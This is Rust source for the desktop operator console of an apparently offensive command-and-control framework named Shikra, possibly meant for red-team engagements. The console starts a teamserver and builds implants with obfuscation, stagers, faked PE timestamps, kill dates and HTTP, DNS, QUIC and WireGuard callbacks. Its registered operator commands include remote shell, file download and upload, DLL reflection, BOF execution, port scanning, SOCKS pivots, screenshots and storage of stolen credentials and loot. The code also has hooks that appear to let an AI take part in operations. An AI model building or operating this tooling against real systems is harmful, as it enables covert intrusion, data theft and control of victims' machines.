    name: String,
    mode: String,
    #[serde(default)]
    c2_url: String,
    #[serde(default)]
    http_url: String,
    #[serde(default)]
    quic_url: String,
    #[serde(default)]
    dns_url: String,
    #[serde(default)]
    dns_zone: String,
    #[serde(default)]
    wg_url: String,
    #[serde(default)]
    wg_server_public: String,
    #[serde(default)]
    tls_domain: String,
    #[serde(default)]
    heartbeat_secs: Option<u64>,
    #[serde(default)]
    jitter_secs: Option<u64>,
    #[serde(default)]
    poll_interval_secs: Option<u64>,
    #[serde(default)]
    obf_seed: String,
    #[serde(default)]
    no_obfuscation: bool,
    #[serde(default = "default_true")]
    release: bool,
    output_dir: String,
    ca_cert: String,
    #[serde(default)]
    enroll_token_file: String,
    #[serde(default)]
    server_identity_file: String,
    #[serde(default)]
    target: String,
    #[serde(default)]
    stager: bool,
    #[serde(default)]
    stage_url: String,
    #[serde(default)]
    stage_args: String,
    #[serde(default)]
    killdate_unix: Option<u64>,
    #[serde(default)]
    working_hours: String,
    #[serde(default)]
    replace_strings: Vec<String>,
    #[serde(default)]
    service_name: String,
    #[serde(default)]
    pipe_path: String,
    #[serde(default)]
    pe_timestamp: String,
    #[serde(default = "default_true")]
    use_server_profiles: bool,
}

fn default_true() -> bool {
    true
}

fn workspace_binary(name: &str) -> Result<PathBuf, String> {
    let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
        .parent()
        .ok_or_else(|| "cannot locate workspace root".to_string())?
        .to_path_buf();
    let suffix = if cfg!(windows) { ".exe" } else { "" };
    for profile in ["release", "debug"] {
        let candidate = root
            .join("target")
            .join(profile)
            .join(format!("{name}{suffix}"));
        if candidate.exists() {
            return Ok(candidate);
        }
    }
    Err(format!(
        "{name} binary not found; run `cargo build --release -p {name}` (or the GUI dev task) first"
    ))
}

fn builder_binary() -> Result<PathBuf, String> {
    workspace_binary("shikra-builder")
}

fn scripts_dir() -> PathBuf {
    let home = std::env::var("HOME")
        .or_else(|_| std::env::var("USERPROFILE"))
        .unwrap_or_else(|_| ".".into());
    PathBuf::from(home).join(".shikra").join("scripts")
}

fn sanitize_script_name(name: &str) -> Result<String, String> {
    let trimmed = name.trim().trim_end_matches(".js");
    if trimmed.is_empty()
        || trimmed.len() > 64
        || !trimmed
            .chars()
            .all(|ch| ch.is_ascii_alphanumeric() || matches!(ch, '-' | '_'))
    {
        return Err("script name must be 1-64 chars of letters, digits, '-' or '_'".into());
    }
    Ok(format!("{trimmed}.js"))
}

const EXAMPLE_SESSIONS_REPORT: &str = r#"// Inventory report across all sessions.
const rows = [];
for (const session of await shikra.sessions()) {
  rows.push(`${session.hostname}\t${session.username}\t${session.platform}\t${session.status}`);
}
console.log(rows.length ? rows.join("\n") : "no sessions");
"#;

const EXAMPLE_MASS_ECHO: &str = r#"// Run a command on every active session.
for (const session of await shikra.sessions()) {
  if (session.status === "dead") continue;
  const result = await shikra.run(session.id, "echo", { message: `hello ${session.hostname}` });
  console.log(`${session.hostname}: ${result.output.trim()} (exit ${result.exit_code})`);
}
"#;

#[tauri::command]
fn scripts_list() -> Result<Vec<serde_json::Value>, String> {
    let dir = scripts_dir();
    std::fs::create_dir_all(&dir).map_err(|err| format!("failed to create scripts dir: {err}"))?;
    let mut entries: Vec<serde_json::Value> = std::fs::read_dir(&dir)
        .map_err(|err| err.to_string())?
        .filter_map(|entry| entry.ok())
        .filter(|entry| {
            entry
                .path()
                .extension()
                .map(|ext| ext == "js")
                .unwrap_or(false)
        })
        .map(|entry| {
            let metadata = entry.metadata().ok();
            serde_json::json!({
                "name": entry.file_name().to_string_lossy().trim_end_matches(".js"),
                "size": metadata.as_ref().map(|m| m.len()).unwrap_or(0),
                "modified": metadata
                    .and_then(|m| m.modified().ok())
                    .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
                    .map(|d| d.as_secs())
                    .unwrap_or(0),
            })
        })
        .collect();
    if entries.is_empty() {
        let _ = std::fs::write(dir.join("sessions_report.js"), EXAMPLE_SESSIONS_REPORT);
        let _ = std::fs::write(dir.join("mass_echo.js"), EXAMPLE_MASS_ECHO);
        return scripts_list();
    }
    entries.sort_by(|a, b| a["name"].as_str().cmp(&b["name"].as_str()));
    Ok(entries)
}

#[tauri::command]
fn scripts_read(name: String) -> Result<String, String> {
    let file = sanitize_script_name(&name)?;
    std::fs::read_to_string(scripts_dir().join(file))
        .map_err(|err| format!("failed to read script: {err}"))
}

#[tauri::command]
fn scripts_write(name: String, content: String) -> Result<String, String> {
    let file = sanitize_script_name(&name)?;
    let dir = scripts_dir();
    std::fs::create_dir_all(&dir).map_err(|err| err.to_string())?;
    std::fs::write(dir.join(&file), content).map_err(|err| err.to_string())?;
    Ok(file)
}

#[tauri::command]
fn scripts_delete(name: String) -> Result<(), String> {
    let file = sanitize_script_name(&name)?;
    let path = scripts_dir().join(file);
    if path.exists() {
        std::fs::remove_file(path).map_err(|err| err.to_string())?;
    }
    Ok(())
}

pub(crate) fn console_config_path() -> PathBuf {
    let home = std::env::var("HOME")
        .or_else(|_| std::env::var("USERPROFILE"))
        .unwrap_or_else(|_| ".".into());
    PathBuf::from(home).join(".shikra").join("console.json")
}

#[derive(serde::Deserialize)]
#[serde(rename_all = "camelCase")]
struct EmbeddedDbOptions {
    state_dir: String,
    password: String,
}

/// Starts a private PostgreSQL instance inside the state directory, using
/// binaries provisioned by `postgresql_embedded` (no system installation
/// required). Idempotent: returns the running instance when already started.
#[tauri::command]
async fn database_embedded_start(
    state: State<'_, Arc<AppState>>,
    options: EmbeddedDbOptions,
) -> Result<serde_json::Value, String> {
    if options.state_dir.trim().is_empty() {
        return Err("state directory is required".into());
    }
    let mut guard = state.embedded_db.lock().await;
    if let Some(db) = guard.as_ref() {
        return Ok(serde_json::json!({
            "running": true,
            "port": db.port,
            "url": db.database_url,
        }));
    }

    let base = PathBuf::from(options.state_dir.trim());
    std::fs::create_dir_all(&base)
        .map_err(|err| format!("failed to create {}: {err}", base.display()))?;

    let mut settings = postgresql_embedded::Settings::new();
    settings.data_dir = base.join("pgdata");
    settings.installation_dir = base.join("pgsql");
    // initdb always creates the bootstrap superuser; the URL must use it.
    settings.username = BOOTSTRAP_DB_USER.into();
    settings.password = options.password;
    settings.temporary = false;

    let mut postgres = postgresql_embedded::PostgreSQL::new(settings);
    postgres
        .setup()
        .await
        .map_err(|err| format!("embedded database setup failed: {err}"))?;
    postgres
        .start()
        .await
        .map_err(|err| format!("embedded database failed to start: {err}"))?;

    let database_name = "shikra";
    let exists = postgres
        .database_exists(database_name)
        .await
        .map_err(|err| format!("failed to inspect embedded database: {err}"))?;
    if !exists {
        postgres
            .create_database(database_name)
            .await
            .map_err(|err| format!("failed to create shikra database: {err}"))?;
    }

    let database_url = postgres.settings().url(database_name);
    let port = postgres.settings().port;
    *guard = Some(EmbeddedDb {
        postgres,
        database_url: database_url.clone(),
        port,
    });
    Ok(serde_json::json!({
        "running": true,
        "port": port,
        "url": database_url,
    }))
}

#[tauri::command]
async fn database_embedded_stop(state: State<'_, Arc<AppState>>) -> Result<String, String> {
    let mut guard = state.embedded_db.lock().await;
    match guard.as_mut() {
        Some(db) => {
            db.postgres
                .stop()
                .await
                .map_err(|err| format!("failed to stop embedded database: {err}"))?;
            *guard = None;
            Ok("embedded database stopped".into())
        }
        None => Ok("embedded database is not running".into()),
    }
}

#[tauri::command]
async fn database_embedded_status(
    state: State<'_, Arc<AppState>>,
) -> Result<serde_json::Value, String> {
    let guard = state.embedded_db.lock().await;
    Ok(match guard.as_ref() {
        Some(db) => serde_json::json!({
            "running": true,
            "port": db.port,
            "url": db.database_url,
        }),
        None => serde_json::json!({ "running": false }),
    })
}

#[tauri::command]
async fn console_config_get() -> Result<serde_json::Value, String> {
    let path = console_config_path();
    if !path.exists() {
        return Ok(serde_json::json!({}));
    }
    let raw = std::fs::read_to_string(&path)
        .map_err(|err| format!("failed to read {}: {err}", path.display()))?;
    serde_json::from_str(&raw).map_err(|err| format!("invalid console config: {err}"))
}

#[tauri::command]
async fn console_config_save(config: serde_json::Value) -> Result<(), String> {
    let path = console_config_path();
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent)
            .map_err(|err| format!("failed to create {}: {err}", parent.display()))?;
    }
    let raw = serde_json::to_string_pretty(&config)
        .map_err(|err| format!("failed to encode console config: {err}"))?;
    std::fs::write(&path, raw)
        .map_err(|err| format!("failed to write {}: {err}", path.display()))?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let _ = std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o600));
    }
    Ok(())
}

#[derive(serde::Deserialize, Clone)]
#[serde(rename_all = "camelCase")]
struct ServerOptions {
    state_dir: String,
    database_url: String,
    #[serde(default = "default_operator_addr")]
    grpc_addr: String,
    #[serde(default = "default_health_addr")]
    health_addr: String,
}

fn default_operator_addr() -> String {
    "127.0.0.1:8443".into()
}

fn default_health_addr() -> String {
    "127.0.0.1:0".into()
}

/// The listener addresses stay on their defaults; transports are configured
/// when a payload is built, not when the server is hosted.
fn server_command(options: &ServerOptions) -> Result<std::process::Command, String> {
    let binary = workspace_binary("shikra-server")?;
    let mut command = std::process::Command::new(binary);
    command
        .arg("--state-dir")
        .arg(options.state_dir.trim())
        .arg("--database-url")
        .arg(options.database_url.trim())
        .arg("--grpc-addr")
        .arg(options.grpc_addr.trim())
        .arg("--health-addr")
        .arg(options.health_addr.trim());
    Ok(command)
}

#[tauri::command]
async fn server_bootstrap(options: ServerOptions) -> Result<serde_json::Value, String> {
    if options.state_dir.trim().is_empty() {
        return Err("state directory is required".into());
    }
    let mut command = server_command(&options)?;
    command.arg("--bootstrap");
    let output = command
        .output()
        .map_err(|err| format!("failed to start shikra-server: {err}"))?;
    if !output.status.success() {
        return Err(format!(
            "bootstrap failed: {}",
            String::from_utf8_lossy(&output.stderr)
        ));
    }
    let stdout = String::from_utf8_lossy(&output.stdout);
    serde_json::from_str(stdout.trim()).map_err(|err| format!("unexpected bootstrap output: {err}"))
}

#[tauri::command]
async fn server_start(
    state: State<'_, Arc<AppState>>,
    options: ServerOptions,
) -> Result<serde_json::Value, String> {
    let mut guard = state.server_process.lock().await;
    if let Some(child) = guard.as_mut() {
        if child.try_wait().map_err(|err| err.to_string())?.is_none() {
            return Err("teamserver is already running".into());
        }
    }
    if options.database_url.trim().is_empty() {
        return Err("database URL is required".into());
    }
    // Surface port conflicts before spawning; exit code otherwise hides them.
    let operator_addr: std::net::SocketAddr = options
        .grpc_addr
        .trim()
        .parse()
        .map_err(|_| format!("invalid operator address {:?}", options.grpc_addr))?;
    match tokio::net::TcpListener::bind(operator_addr).await {
        Ok(probe) => drop(probe),
        Err(err) => {
            return Err(format!(
                "operator port {} is unavailable ({err}); pick another port",
                operator_addr.port()
            ))
        }
    }
    let log_path = std::path::Path::new(options.state_dir.trim()).join("server.log");
    std::fs::create_dir_all(options.state_dir.trim())
        .map_err(|err| format!("failed to create state dir: {err}"))?;
    let log = std::fs::File::create(&log_path)
        .map_err(|err| format!("failed to open {}: {err}", log_path.display()))?;
    let log_err = log
        .try_clone()
        .map_err(|err| format!("failed to clone log handle: {err}"))?;

    let mut command = tokio::process::Command::from(server_command(&options)?);
    command
        .stdout(std::process::Stdio::from(log))
        .stderr(std::process::Stdio::from(log_err));
    let child = command
        .spawn()
        .map_err(|err| format!("failed to start shikra-server: {err}"))?;
    let pid = child.id();
    *guard = Some(child);
    Ok(serde_json::json!({
        "pid": pid,
        "log_path": log_path.display().to_string(),
    }))
}

#[tauri::command]
async fn server_stop(state: State<'_, Arc<AppState>>) -> Result<String, String> {
    let mut guard = state.server_process.lock().await;
    match guard.as_mut() {
        Some(child) => {
            child.kill().await.map_err(|err| err.to_string())?;
            let _ = child.wait().await;
            *guard = None;
            Ok("teamserver stopped".into())
        }
        None => Ok("teamserver is not running".into()),
    }
}

#[tauri::command]
async fn server_status(state: State<'_, Arc<AppState>>) -> Result<serde_json::Value, String> {
    let mut guard = state.server_process.lock().await;
    let mut running = false;
    let mut pid = None;
    if let Some(child) = guard.as_mut() {
        if child.try_wait().map_err(|err| err.to_string())?.is_none() {
            running = true;
            pid = Some(child.id());
        } else {
            *guard = None;
        }
    }
    Ok(serde_json::json!({ "running": running, "pid": pid }))
}

#[tauri::command]
async fn server_log(state_dir: String, lines: usize) -> Result<String, String> {
    let path = std::path::Path::new(state_dir.trim()).join("server.log");
    let raw = std::fs::read_to_string(&path).unwrap_or_default();
    let tail: Vec<&str> = raw.lines().rev().take(lines.max(1)).collect();
    Ok(tail.into_iter().rev().collect::<Vec<_>>().join("\n"))
}

#[tauri::command]
async fn build_payload(
    state: State<'_, Arc<AppState>>,
    options: BuildOptions,
) -> Result<serde_json::Value, String> {
    if options.name.trim().is_empty() {
        return Err("payload name is required".into());
    }
    if options.ca_cert.trim().is_empty() {
        return Err("a CA certificate is required to pin the server".into());
    }
    if options.output_dir.trim().is_empty() {
        return Err("an output directory is required".into());
    }
    // Bake the teamserver's live profiles into beacons so rotation URIs and
    // headers match the listener configuration exactly.
    let mut profiles_path: Option<PathBuf> = None;
    if options.mode == "beacon" && options.use_server_profiles {
        let fetched = {
            let mut guard = state.client.lock().await;
            let client = guard
                .as_mut()
                .ok_or_else(|| "connect to a teamserver to use its profiles".to_string())?;
            client.profiles().await.map_err(|err| err.to_string())?
        };
        if !fetched.is_empty() {
            let path = std::path::Path::new(options.output_dir.trim())
                .join(format!("{}.profiles.json", options.name.trim()));
            std::fs::create_dir_all(options.output_dir.trim())
                .map_err(|err| format!("failed to create output dir: {err}"))?;
            let set = serde_json::json!({
                "profiles": fetched
                    .iter()
                    .map(|profile| serde_json::json!({
                        "name": profile.name,
                        "user_agent": profile.user_agent,
                        "enroll_uri": profile.enroll_uri,
                        "poll_uri": profile.poll_uri,
                        "request_headers": profile.request_headers,
                        "response_headers": profile.response_headers,
                        "poll_interval_secs": profile.poll_interval_secs,
                        "jitter_secs": profile.jitter_secs,
                    }))
                    .collect::<Vec<_>>()
            });
            std::fs::write(&path, set.to_string())
                .map_err(|err| format!("failed to stage profiles: {err}"))?;
            profiles_path = Some(path);
        }
    }

    let builder = builder_binary()?;
    let mut command = tokio::process::Command::new(builder);
    command.arg("--name").arg(options.name.trim());
    let mode = match options.mode.as_str() {
        "wireguard" | "wire_guard" | "wire-guard" => "wire-guard",
        other => other,
    };
    command.arg("--mode").arg(mode);
    command.arg("--output-dir").arg(&options.output_dir);
    command.arg("--ca-cert").arg(&options.ca_cert);
    if !options.c2_url.trim().is_empty() {
        command.arg("--c2-url").arg(options.c2_url.trim());
    }
    if !options.http_url.trim().is_empty() {
        command.arg("--http-url").arg(options.http_url.trim());
    }
    if !options.quic_url.trim().is_empty() {
        command.arg("--quic-url").arg(options.quic_url.trim());
    }
    if !options.dns_url.trim().is_empty() {
        command.arg("--dns-url").arg(options.dns_url.trim());
    }
    if !options.dns_zone.trim().is_empty() {
        command.arg("--dns-zone").arg(options.dns_zone.trim());
    }
    if !options.wg_url.trim().is_empty() {
        command.arg("--wg-url").arg(options.wg_url.trim());
    }
    if !options.wg_server_public.trim().is_empty() {
        command
            .arg("--wg-server-public")
            .arg(options.wg_server_public.trim());
    }
    if !options.tls_domain.trim().is_empty() {
        command.arg("--tls-domain").arg(options.tls_domain.trim());
    }
    if let Some(heartbeat) = options.heartbeat_secs {
        command.arg("--heartbeat-secs").arg(heartbeat.to_string());
    }
    if let Some(jitter) = options.jitter_secs {
        command.arg("--jitter-secs").arg(jitter.to_string());
    }
    if let Some(interval) = options.poll_interval_secs {
        command
            .arg("--poll-interval-secs")
            .arg(interval.to_string());
    }
    if !options.enroll_token_file.trim().is_empty() {
        command
            .arg("--enroll-token-file")
            .arg(options.enroll_token_file.trim());
    }
    if !options.server_identity_file.trim().is_empty() {
        command
            .arg("--server-identity-file")
            .arg(options.server_identity_file.trim());
    }
    if !options.target.trim().is_empty() {
        command.arg("--target").arg(options.target.trim());
    }
    if !options.obf_seed.trim().is_empty() {
        command.arg("--obf-seed").arg(options.obf_seed.trim());
    }
    if options.no_obfuscation {
        command.arg("--no-obfuscation");
    }
    if let Some(killdate) = options.killdate_unix.filter(|killdate| *killdate > 0) {
        command.arg("--killdate").arg(killdate.to_string());
    }
    if !options.working_hours.trim().is_empty() {
        command
            .arg("--working-hours")
            .arg(options.working_hours.trim());
    }
    for spec in &options.replace_strings {
        if !spec.trim().is_empty() {
            command.arg("--replace-string").arg(spec.trim());
        }
    }
    if !options.pe_timestamp.trim().is_empty() {
        command
            .arg("--pe-timestamp")
            .arg(options.pe_timestamp.trim());
    }
    if !options.service_name.trim().is_empty() {
        command.arg("--service").arg(options.service_name.trim());
    }
    if !options.pipe_path.trim().is_empty() {
        command.arg("--pipe").arg(options.pipe_path.trim());
    }
    if !options.release {
        command.arg("--release=false");
    }
    if options.stager {
        command.arg("--stager");
        if !options.stage_url.trim().is_empty() {
            command.arg("--stage-url").arg(options.stage_url.trim());
        }
        if !options.stage_args.trim().is_empty() {
            command.arg("--stage-args").arg(options.stage_args.trim());
        }
    }
    if let Some(path) = &profiles_path {
        command.arg("--profiles-file").arg(path);
    }

    let output = command
        .output()
        .await
        .map_err(|err| format!("failed to start builder: {err}"))?;
    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    if !output.status.success() {
        let tail: String = stderr
            .lines()
            .rev()
            .take(20)
            .collect::<Vec<_>>()
            .into_iter()
            .rev()
            .collect::<Vec<_>>()
            .join(
                "
",
            );
        return Err(format!(
            "build failed ({}):
{tail}",
            output.status
        ));
    }
    let report = stdout
        .lines()
        .rev()
        .find_map(|line| serde_json::from_str::<serde_json::Value>(line).ok())
        .unwrap_or_else(|| serde_json::json!({}));

    let mut result = report.clone();
    if options.stager {
        let dir = std::path::Path::new(&options.output_dir);
        let stage = dir.join(format!("{}.stage", options.name.trim()));
        let stager = dir.join(format!("{}-stager", options.name.trim()));
        result["stage_path"] = serde_json::json!(stage.to_string_lossy());
        result["stager_path"] = serde_json::json!(stager.to_string_lossy());
    }
    result["log"] = serde_json::json!(stderr
        .lines()
        .rev()
        .take(5)
        .collect::<Vec<_>>()
        .into_iter()
        .rev()
        .collect::<Vec<_>>()
        .join(
            "
"
        ));
    Ok(result)
}

#[derive(serde::Deserialize)]
#[serde(rename_all = "camelCase")]
struct ProfileInput {
    name: String,
    user_agent: String,
    enroll_uri: String,
    poll_uri: String,
    #[serde(default)]
    request_headers: std::collections::HashMap<String, String>,
    #[serde(default)]
    response_headers: std::collections::HashMap<String, String>,
    #[serde(default = "default_poll_interval")]
    poll_interval_secs: u64,
    #[serde(default = "default_jitter")]
    jitter_secs: u64,
}

fn default_poll_interval() -> u64 {
    5
}

fn default_jitter() -> u64 {
    3
}

fn profile_json(profile: shikra_proto::v1::ProfileInfo) -> serde_json::Value {
    serde_json::json!({
        "name": profile.name,
        "user_agent": profile.user_agent,
        "enroll_uri": profile.enroll_uri,
        "poll_uri": profile.poll_uri,
        "request_headers": profile.request_headers,
        "response_headers": profile.response_headers,
        "poll_interval_secs": profile.poll_interval_secs,
        "jitter_secs": profile.jitter_secs,
    })
}

#[tauri::command]
async fn profiles(state: State<'_, Arc<AppState>>) -> Result<Vec<serde_json::Value>, String> {
    let mut guard = state.client.lock().await;
    let client = guard
        .as_mut()
        .ok_or_else(|| "not connected to a teamserver".to_string())?;
    let profiles = client.profiles().await.map_err(|err| err.to_string())?;
    Ok(profiles.into_iter().map(profile_json).collect())
}

#[tauri::command]
async fn profiles_save(
    state: State<'_, Arc<AppState>>,
    profiles: Vec<ProfileInput>,
) -> Result<String, String> {
    let converted: Vec<shikra_proto::v1::ProfileInfo> = profiles
        .into_iter()
        .map(|profile| shikra_proto::v1::ProfileInfo {
            name: profile.name,
            user_agent: profile.user_agent,
            enroll_uri: profile.enroll_uri,
            poll_uri: profile.poll_uri,
            request_headers: profile.request_headers.into_iter().collect(),
            response_headers: profile.response_headers.into_iter().collect(),
            poll_interval_secs: profile.poll_interval_secs,
            jitter_secs: profile.jitter_secs,
        })
        .collect();
    let count = converted.len();
    let mut guard = state.client.lock().await;
    let client = guard
        .as_mut()
        .ok_or_else(|| "not connected to a teamserver".to_string())?;
    client
        .set_profiles(converted)
        .await
        .map_err(|err| err.to_string())?;
    Ok(format!("{count} profile(s) applied"))
}

fn main() {
    tauri::Builder::default()
        .plugin(tauri_plugin_dialog::init())
        .setup(|app| {
            app.manage(Arc::new(AppState::default()));
            app.manage(Arc::new(ai::AiState::default()));
            Ok(())
        })
        .invoke_handler(tauri::generate_handler![
            connect,
            disconnect,
            sessions,
            shell,
            run_task,
            fs_ls,
            fs_cat,
            fs_download,
            fs_upload,
            bof_run,
            wasm_load,
            wasm_run,
            wasm_list,
            rportfwd_start,
            rportfwd_stop,
            pivots,
            portscan,
            screenshot,
            native_load,
            native_run,
            native_list,
            extensions,
            extension_push,
            socks_start,
            portfwd_start,
            team_operators,
            team_operator_add,
            team_credentials,
            team_credential_add,
            team_loot,
            team_loot_add,
            team_canaries,
            team_canary_create,
            team_audit,
            team_report,
            connection_info,
            console_config_get,
            console_config_save,
            database_embedded_start,
            database_embedded_stop,
            database_embedded_status,
            frontend_log,
            read_text,
            write_text,
            scripts_list,
            scripts_read,
            scripts_write,
            scripts_delete,
            reflect_dll,
            tasks_list,
            task_cancel,
            chat_list,
            chat_send,
            events_list,
            session_set_ui,
            webhook_get,
            webhook_set,
            material_siblings,
            ai::ai_status,
            ai::ai_config_save,
            ai::ai_send,
            ai::ai_approve,
            ai::ai_reset,
            publish_stage,
            listeners,
            listener_start,
            listener_stop,
            pick_free_port,
            server_bootstrap,
            server_start,
            server_stop,
            server_status,
            server_log,
            build_payload,
            profiles,
            profiles_save
        ])
        .build(tauri::generate_context!())
        .expect("error while building Shikra Console")
        .run(|app_handle, event| {
            if let tauri::RunEvent::Exit = event {
                let state = app_handle.state::<Arc<AppState>>().inner().clone();
                tauri::async_runtime::block_on(async move {
                    if let Some(db) = state.embedded_db.lock().await.as_mut() {
                        let _ = db.postgres.stop().await;
                    }
                });
            }
        });
}

#[cfg(test)]
mod tests {
    use super::*;
    use shikra_proto::v1::{
        Architecture, Platform, SessionInfo, SessionKind, SessionStatus, TaskResult, TaskState,
    };

    fn session_info() -> SessionInfo {
        SessionInfo {
            id: "s-1".into(),
            engagement_id: "e-1".into(),
            kind: SessionKind::Beacon as i32,
            status: SessionStatus::Stale as i32,
            platform: Platform::Linux as i32,
            architecture: Architecture::Aarch64 as i32,
            hostname: "host-1".into(),
            username: "user-1".into(),
            process_name: "implant".into(),
            remote_addr: "10.0.0.5:1234".into(),
            first_seen: None,
            last_seen: Some(prost_types_timestamp(1_700_000_000)),
            killdate_unix: 0,
            working_hours: String::new(),
            color: String::new(),
            operator_status: String::new(),
        }
    }

    fn prost_types_timestamp(seconds: i64) -> prost_types::Timestamp {
        prost_types::Timestamp { seconds, nanos: 0 }
    }

    #[tokio::test]
    #[ignore = "provisions a full embedded PostgreSQL; run explicitly"]
    async fn embedded_database_provisions_and_serves() {
        let dir = tempfile_dir();
        let mut settings = postgresql_embedded::Settings::new();
        settings.data_dir = dir.join("pgdata");
        settings.installation_dir = dir.join("pgsql");
        settings.username = BOOTSTRAP_DB_USER.into();
        settings.password = "shikra-secret".into();
        settings.temporary = false;
        let mut postgres = postgresql_embedded::PostgreSQL::new(settings);
        postgres.setup().await.expect("setup");
        postgres.start().await.expect("start");
        let exists = postgres.database_exists("shikra").await.expect("exists");
        assert!(!exists);
        postgres.create_database("shikra").await.expect("create db");
        let url = postgres.settings().url("shikra");
        let pool = sqlx::PgPool::connect(&url).await.expect("connect");
        let value: i32 = sqlx::query_scalar("SELECT 1")
            .fetch_one(&pool)
            .await
            .expect("query");
        assert_eq!(value, 1);
        pool.close().await;
        postgres.stop().await.expect("stop");
    }

    fn tempfile_dir() -> std::path::PathBuf {
        let dir = std::env::temp_dir().join(format!("shikra-console-test-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).expect("temp dir");
        dir
    }

    #[test]
    fn session_dto_maps_enums_and_timestamp() {
        let dto = to_session_dto(session_info());
        assert_eq!(dto.kind, "beacon");
        assert_eq!(dto.status, "stale");
        assert_eq!(dto.platform, "linux");
        assert_eq!(dto.architecture, "aarch64");
        assert_eq!(dto.last_seen_unix, 1_700_000_000);
    }

    #[test]
    fn task_dto_maps_state_and_output() {
        let dto = to_task_dto(TaskResult {
            task_id: "t-1".into(),
            session_id: "s-1".into(),
            state: TaskState::Completed as i32,
            exit_code: 0,
            output: b"hello".to_vec(),
            completed_at: None,
        });
        assert_eq!(dto.state, "completed");
        assert_eq!(dto.output, "hello");
    }

    #[test]
    fn task_dto_handles_binary_output_lossily() {
        let dto = to_task_dto(TaskResult {
            task_id: "t-2".into(),
            session_id: "s-1".into(),
            state: TaskState::Failed as i32,
            exit_code: 1,
            output: vec![0xff, 0xfe, 0x00],
            completed_at: None,
        });
        assert_eq!(dto.state, "failed");
        assert_eq!(dto.exit_code, 1);
    }
}
